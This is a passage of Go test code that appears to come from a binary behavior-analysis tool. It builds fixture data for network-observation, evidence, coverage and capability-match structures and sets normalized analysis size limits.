		NetworkImplementations: []behavior.NetworkImplementationObservation{{ID: "network-implementation-1", Kind: behavior.NetworkImplementationAPICall, SubjectNodeID: "node-child", ScopeID: "scope-child", Architecture: "arm64", OperationIDs: []string{"operation-network"}, APIOrTool: "URLSession", EvidenceIDs: []string{"ev-1"}, Support: behavior.SupportCorroborated, Execution: connected()}},
		Coverage:               []behavior.Coverage{{NodeID: "node-child", AnalysisArea: "text", Status: "analyzed"}},
		Evidence:               []behavior.Evidence{{ID: "ev-1", NodeID: "node-child", ScopeID: "scope-child", Arch: "arm64", Function: "fixtureFunction", Method: "fixture", Kind: "fixture"}},
		Capabilities: []behavior.CapabilityMatch{{
			ID: "capability-1", RuleID: "fixture.capability", Title: "Fixture capability", Namespace: "fixture", SubjectNodeID: "node-child",
			AffectedResources: []behavior.Resource{{Kind: behavior.ResourceFile, Value: "sample!payload"}}, OperationIDs: []string{"operation-1"}, EvidenceIDs: []string{"ev-1"},
			Support: behavior.SupportCorroborated, Execution: connected(), ArchitectureScopes: []string{"arm64"}, MatchTrace: []behavior.MatchTraceClause{{
				Path: "match", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-1"},
			}},
		}},
	}
}

func normalizedTestAnalysis() AnalysisMetadata {
	return AnalysisMetadata{
		ExpandContainers:     true,
		Architecture:         "all",
		MaxFileBytes:         1,
		MaxArchiveBytes:      1,
		MaxExpandedBytes:     1,
		MaxTotalBytes:        1,
		MaxArchiveDepth:      1,
		MaxDirectoryDepth:    1,
		MaxCompressionRatio:  1,
		MaxArtifactNodes:     2,
		MaxArtifactPathBytes: 1,
		MaxEvidence:          1,
		MaxDiagnostics:       1,
		MaxDiagnosticBytes:   1,
	}
}
